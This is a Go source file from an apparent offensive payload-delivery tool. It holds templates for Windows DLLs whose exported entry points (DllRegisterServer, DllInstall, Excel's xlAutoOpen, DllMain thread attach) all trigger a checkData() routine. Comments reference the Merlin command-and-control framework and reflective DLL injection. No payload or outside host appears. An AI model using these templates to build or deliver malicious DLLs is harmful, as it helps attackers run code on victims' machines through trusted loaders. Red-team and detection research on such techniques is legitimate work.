package delivery

const DllImport = `
import "C"
`

const DllFunc = `
//export VoidFunc
func VoidFunc() { checkData() }

//export DllInstall
func DllInstall() { checkData() }

//export DllRegisterServer
func DllRegisterServer() { checkData() }

//export DllUnregisterServer
func DllUnregisterServer() { checkData() }

//export xlAutoOpen
func xlAutoOpen() { checkData() }

//export xlAutoRegister 
func xlAutoRegister() { checkData() }

//export xlAutoRegister12
func xlAutoRegister12() { checkData() }
`

const DllProcAttach = `#include <windows.h>
#include <stdio.h>


// https://docs.microsoft.com/en-us/windows/desktop/dlls/dynamic-link-library-entry-point-function

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpReserved )  // reserved
{
    // Perform actions based on the reason for calling.
    switch( fdwReason )
    {
        case DLL_PROCESS_ATTACH:
            // Initialize once for each new process.
            // Return FALSE to fail DLL load.
            // printf("[+] Hello from DllMain-PROCESS_ATTACH in Merlin\n");
            // MessageBoxA( NULL, "Hello from DllMain-PROCESS_ATTACH in Merlin!", "Reflective Dll Injection", MB_OK );
            break;

        case DLL_THREAD_ATTACH:
            // Do thread-specific initialization.
            checkData();
            break;

        case DLL_THREAD_DETACH:
            // Do thread-specific cleanup.
            break;

        case DLL_PROCESS_DETACH:
            // Perform any necessary cleanup.
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}

`